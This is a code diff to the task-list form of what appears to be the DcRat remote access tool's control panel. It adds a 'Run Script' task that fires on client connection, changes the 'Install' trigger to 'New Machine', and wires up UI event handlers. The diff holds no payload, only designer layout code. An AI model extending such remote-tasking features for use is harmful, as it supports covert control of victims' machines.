@@ -33,8 +33,13 @@ namespace DcRat.ChildForms
             System.Windows.Forms.ListViewItem listViewItem1 = new System.Windows.Forms.ListViewItem(new string[] {
             "Install",
             "On",
-            "OnConnection",
+            "New Machine",
             "2"}, -1);
+            System.Windows.Forms.ListViewItem listViewItem2 = new System.Windows.Forms.ListViewItem(new string[] {
+            "Run Script",
+            "Off",
+            "OnConnection",
+            "0"}, -1);
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(childFormTasks));
             this.listViewtasks = new System.Windows.Forms.ListView();
             this.columnHeadertaskname = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
@@ -64,7 +69,8 @@ namespace DcRat.ChildForms
             this.listViewtasks.FullRowSelect = true;
             this.listViewtasks.HideSelection = false;
             this.listViewtasks.Items.AddRange(new System.Windows.Forms.ListViewItem[] {
-            listViewItem1});
+            listViewItem1,
+            listViewItem2});
             this.listViewtasks.Location = new System.Drawing.Point(0, 0);
             this.listViewtasks.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
             this.listViewtasks.MultiSelect = false;
@@ -75,6 +81,7 @@ namespace DcRat.ChildForms
             this.listViewtasks.TabIndex = 0;
             this.listViewtasks.UseCompatibleStateImageBehavior = false;
             this.listViewtasks.View = System.Windows.Forms.View.Details;
+            this.listViewtasks.ColumnClick += new System.Windows.Forms.ColumnClickEventHandler(this.listViewtasks_ColumnClick);
             this.listViewtasks.DrawColumnHeader += new System.Windows.Forms.DrawListViewColumnHeaderEventHandler(this.listViewtasks_DrawColumnHeader);
             this.listViewtasks.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(this.listViewtasks_DrawItem);
             this.listViewtasks.SelectedIndexChanged += new System.EventHandler(this.listViewtasks_SelectedIndexChanged);
@@ -159,6 +166,7 @@ namespace DcRat.ChildForms
             this.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
             this.Name = "childFormTasks";
             this.Text = "childFormTasks";
+            this.Load += new System.EventHandler(this.childFormTasks_Load);
             this.contextMenuStripTasks.ResumeLayout(false);
             this.ResumeLayout(false);
 
